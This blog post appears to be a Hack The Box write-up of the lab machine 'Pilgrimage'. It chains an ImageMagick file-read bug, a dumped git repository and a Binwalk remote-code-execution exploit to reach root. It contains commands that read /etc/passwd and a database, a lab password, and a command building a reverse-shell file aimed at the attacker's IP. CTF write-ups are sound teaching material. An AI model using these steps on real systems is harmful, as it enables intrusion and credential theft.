---
layout: post
title: Pilgrimage
date: 2023-10-15 10:14:00-0400
description: Pilgrimage - Hack The Box write-up
tags: easy-box htb ctf
categories: HTB-Machines
thumbnail: /assets/img/2023-pilgrimagelogo.jpg
giscus_comments: false
related_posts: false
toc:
  beginning: true
featured: false
---

## Introduction

Pilgrimage is a relatively challenging Easy box where an Arbitrary File Read vulnerability is exploited to steal a username..

The same exploit used in the AFR vulnerability is used against a Local File Inclusion vulnerability, which ultimately provided the user's password.

Once logged in  [pspy64](https://github.com/DominicBreuker/pspy) finds a script executing as `root`, that is using a version of `binwalk` that is vulnerable to Remote Code Execution.

This is ultimately used to elevate privileges to `root`.

### Tools, exploits, and CVEs

| Tool       | Description | 
|-----------------|----------|
|[Git Dumper](https://github.com/arthaud/git-dumper) | A tool to dump a git repository from a website. |
|[CVE-2022-44268 AFR PoC](https://github.com/voidz0r/CVE-2022-44268)| This is a proof of concept of the ImageMagick bug discovered by [https://www.metabaseq.com/imagemagick-zero-days/](https://www.metabaseq.com/imagemagick-zero-days/)Tested on ImageMagick v. 7.1.0-48 and 6.9.11-60|
| [Pspy](https://github.com/DominicBreuker/pspy)| pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
| [CVE-2022-4510-Binwalk RCE Poc](https://github.com/adhikara13/CVE-2022-4510-WalkingPath#cve-2022-4510-binwalk)|This script allows you to generate exploits for targeting CVE-2022-4510 Binwalk vulnerabilities. The exploits can be used for testing and demonstrations. The supported options include SSH, command execution, and reverse shell.|

### What's an Arbitrary File Read

An Arbitrary File Read vulnerability allows an attacker to read files on a system that they shouldn't have access to. This could include sensitive configuration files, database credentials, or any other sensitive data stored on the server. The vulnerability occurs due to improper validation or lack of permissions in the application's code, and it can lead to information disclosure or further exploitation if chained with other vulnerabilities.

### What's a Local File Inclusion (LFI)

A Local File Inclusion (LFI) vulnerability allows an attacker to include files from the server's local filesystem into the output of a web application. This can lead to sensitive information disclosure, such as reading the /etc/passwd file on a Linux machine. LFI vulnerabilities typically occur due to poor validation of user input in web applications and can sometimes be escalated to execute arbitrary code on the server.

### What's binwalk?

Binwalk is a tool commonly used for analyzing, reverse engineering, and extracting firmware images. It's widely used for security research and has various functionalities suitable for exploring a file's structure. Essentially, it scans the given binary file for known patterns or "magic bytes," then provides you with information about what each segment of bytes represents.

For instance, you might use binwalk to:

- Identify embedded file systems in a firmware image.
- Extract those file systems for further analysis.
- Identify executable code, or other types of data, embedded in the firmware.

## Enumeration

Began with nmap scan
```bash
nmap -sV -sC -T4 10.129.80.229 -v -oA nmap-pilgrimage

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 15 21:07:33 2023 -- 1 IP address (1 host up) scanned in 44.45 seconds
```

Two ports:
- 22
- 80

Browsing to IP returns `http://pilgrimage.htb/`. Add to hosts:

```bash
10.129.80.229 pilgrimage.htb
```
## Site enumeration

Lands on a site that appears to be a free online image shrinker.
<img src="/assets/img/20231016-pilgrimage-1.png" alt="Image of site" class="auto-resize">

Appears you can register or login, but that is not necessary to use the service.

Uploading a file shrinks it and provides a url to the location:
`http://pilgrimage.htb/shrunk/652c8e6fd005d.png`

Navigating to `http://pilgrimage.htb/shrunk/` returns a 403 error

Looking at port 80 more closely, and a git repo is found:

Looking at port 80 more closely, and a git repo is found:
```shell
nmap -sCV -p 80 10.129.80.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 21:44 EDT
Nmap scan report for pilgrimage.htb (10.129.80.229)
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.129.80.229:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
```

## Git Repo enumeration
Used https://github.com/arthaud/git-dumper.git to dump git repo:

```shell
──(kali㉿kali)-[~/Documents/HTB-Machines/pilgrimage/findings]
└─$ git-dumper http://pilgrimage.htb/.git git
```

Appears to use `magick`,  command-line utility that is part of the ImageMagick suite of tools. ImageMagick is a software suite to create, edit, compose, or convert bitmap images. It can read, convert, and write images in a variety of formats like JPEG, PNG, GIF, BMP, and many others. The magick command is used for converting between image formats as well as resizing, cropping, and performing other image manipulation tasks.

<img src="/assets/img/20231016-pilgrimage-2.png" alt="Image of git"class="auto-resize">

Can pull the version:
```shell
┌──(kali㉿kali)-[~/…/HTB-Machines/pilgrimage/findings/git]
└─$ ./magick -usage
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
```

The magick version is vulnerable to a **Arbitrary File Read**
<img src="/assets/img/220231016-pilgrimage-3.png" alt="Image of searchsploit" class="auto-resize">


## Initial access

### Arbitrary File Read
Used https://github.com/voidz0r/CVE-2022-44268 PoC.

Read `/etc/passwd` file and found user `emily`
<img src="/assets/img/20231016-pilgrimage-4.png" alt="Image found user" class="auto-resize">


### Local File Inclusion
The **dashboard.php** makes queries to a SQLite database at `/var/db/pilgrimage`

Downloaded DB using the LFI vulnerability

```shell
┌──(kali㉿kali)-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─$ cargo run "/var/db/pilgrimage"
    Finished dev [unoptimized + debuginfo] target(s) in 0.02s
     Running `target/debug/cve-2022-44268 /var/db/pilgrimage`

```

Upload image.png and download converted file, and grab hex response:
```shell
┌──(kali㉿kali)-[~/…/HTB-Machines/pilgrimage/exploits/CVE-2022-44268]
└─$ identify -verbose 652ca0d768621.png
Image: 652ca0d768621.png
  Format: PNG (Portable Network Graphics)
  Geometry: 100x100
  Class: PseudoClass
  Type: palette
  Depth: 1 bits-per-pixel component
  Channel Depths:
    Red:      1 bits
    Green:    1 bits
    Blue:     1 bits
  Channel Statistics:
    Red:
      Minimum:                 65535.00 (1.0000)
      Maximum:                 65535.00 (1.0000)
      Mean:                    65535.00 (1.0000)
      Standard Deviation:          0.00 (0.0000)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
    Blue:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
  Colors: 2
    0: (255,  0,  0)      red
    1: (255,255,255)      white
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.1Ki
  Interlace: No
  Orientation: Unknown
  Background Color: #FEFEFE
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 100x100+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 3
  Png:IHDR.bit-depth-orig: 1
  Raw profile type:

   20480
53514c69746520666f726d61742033001000010100402020000000440000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000044002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
<SNIP>

6e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f
363532633963376562306134642e706e670231036909687474703a2f2f70696c6772696d
6167652e6874622f736872756e6b2f363532633939623661643562392e706e67

  Date:create: 2023-10-16T02:32:55+00:00
  Date:modify: 2023-10-16T02:32:55+00:00
  Date:timestamp: 2023-10-16T02:32:55+00:00
  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6
  Tainted: False
  User Time: 0.040u
  Elapsed Time: 0m:0.005439s
  Pixels Per Second: 1.8Mi
```

Save hex to file and remove `\n`

```shell
tr -d '\n' < db-hex > cleaned-db-hex
```

pass the file to a hex to string conversion:

```python
python3 -c "print(bytes.fromhex(open('hex_data.txt', 'r').read().strip()))"
```

Find a password:
<img src="/assets/img/20231016-pilgrimage-5a.png" alt="Found password" class="auto-resize">

## Logging in
User the credentials `emily:abigchonkyboi123` to log in via ssh.
<img src="/assets/img/20231016-pilgrimage-6.png" alt="SSH in" class="auto-resize">

## Privilege escalation
No sudo privs

```shell
emily@pilgrimage:~$ sudo -l
[sudo] password for emily:
Sorry, user emily may not run sudo on pilgrimage.
emily@pilgrimage:~$
```

Upload [pspy64](https://github.com/DominicBreuker/pspy).

```shell
emily@pilgrimage:~/test$ chmod +x pspy64
emily@pilgrimage:~/test$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/10/16 14:03:12 CMD: UID=1000  PID=1613   | ./pspy64
2023/10/16 14:03:12 CMD: UID=0     PID=1605   |
2023/10/16 14:03:12 CMD: UID=0     PID=1604   |
2023/10/16 14:03:12 CMD: UID=0     PID=1584   |
2023/10/16 14:03:12 CMD: UID=1000  PID=1528   | -bash
2023/10/16 14:03:12 CMD: UID=1000  PID=1527   | sshd: emily@pts/0
2023/10/16 14:03:12 CMD: UID=0     PID=1515   |
2023/10/16 14:03:12 CMD: UID=1000  PID=1509   | (sd-pam)
2023/10/16 14:03:12 CMD: UID=1000  PID=1507   | /lib/systemd/systemd --user
2023/10/16 14:03:12 CMD: UID=0     PID=1504   | sshd: emily [priv]
2023/10/16 14:03:12 CMD: UID=0     PID=1444   |
```

Found that the root user executes a file name `malwarescan.sh`, which is accessible by the `emily` user.
![[20231016-pilgrimage-7.png]]

Output of the file `malwarescan.sh`:
```sh
emily@pilgrimage:~/test$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The script seems monitors `var/www/pilgrimage.htb/shrunk/` for any newly created files. When a new file is created, it runs various checks to see if the file is of a "blacklisted" type, and if so, removes the file.

It is using `binwalk` version that is vulnerable
```shell
emily@pilgrimage:~/test$ binwalk

Binwalk v2.3.2
```

In the context of the script, binwalk is used to identify the type or characteristics of the newly-created files. If the file has characteristics that match any in a blacklist, the file is removed.

```shell
┌──(kali㉿kali)-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─$ searchsploit -m 51249
  Exploit: Binwalk v2.3.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines (614)
Copied to: /home/kali/Documents/HTB-Machines/pilgrimage/exploits/51249.py
```

Use the exploit to prepare the file:
```shell
┌──(kali㉿kali)-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─$ chmod +x 51249.py

┌──(kali㉿kali)-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─$ python3 51249.py image.png 10.10.14.12 443

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.


┌──(kali㉿kali)-[~/Documents/HTB-Machines/pilgrimage/exploits]
└─$ ls
51249.py  binwalk_exploit.png  CVE-2022-44268  image.png  pspy64
```

Upload the file to `/var/www/pilgrimage.htb/shrunk` and start a listener.

<img src="/assets/img/20231016-pilgrimage-8.png" alt="Image of PE" class="auto-resize">

Done and dusted!